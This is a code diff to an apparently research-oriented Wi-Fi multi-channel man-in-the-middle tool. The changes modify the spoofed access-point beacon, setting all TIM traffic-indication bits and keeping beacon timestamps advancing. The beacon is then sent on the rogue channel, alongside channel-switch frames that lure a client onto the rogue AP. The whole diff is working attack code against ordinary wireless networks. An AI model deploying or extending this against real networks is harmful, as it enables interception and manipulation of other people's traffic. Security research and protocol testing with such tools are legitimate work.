@@ -71,6 +71,13 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	log(LogLevel::INFO,
 		"Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect");
 	setup_real_AP_RSN_frames(att_cfg.at("beacon_timeout_sec"));
+	if(auto *tim_ie = beacon->search_option(Dot11ManagementFrame::TIM)) {
+		vector tim(tim_ie->data_ptr(), tim_ie->data_ptr() + tim_ie->data_size());
+		if(tim.size() >= 4)
+			fill(tim.begin() + 3, tim.end(), 0xFF);
+		beacon->remove_option(Dot11ManagementFrame::TIM);
+		beacon->add_option({Dot11ManagementFrame::TIM, (uint32_t)tim.size(), tim.data()});
+	}
 
 	log(LogLevel::INFO,
 		"Will use {} to create rogue AP on channel {}",
@@ -119,6 +126,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 
 	auto next_beacon = steady_clock::now();
 	const auto start_time = steady_clock::now();
+	const uint64_t beacon_ts0 = beacon->timestamp();
 
 	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, beacon, sta.get(SK::mac));
 
@@ -151,6 +159,9 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 		}
 
 		if(next_beacon <= steady_clock::now()) {
+			beacon->timestamp(beacon_ts0 + static_cast<uint64_t>(
+				duration_cast<microseconds>(steady_clock::now() - start_time).count()));
+			send_to_rogue(*beacon);
 			const bool client_associated = client_state.get_state() >= ClientState::GotMitm;
 			if(!client_associated) {
 				const bool custom = hooks && hooks->send_periodic_beacon(*this);
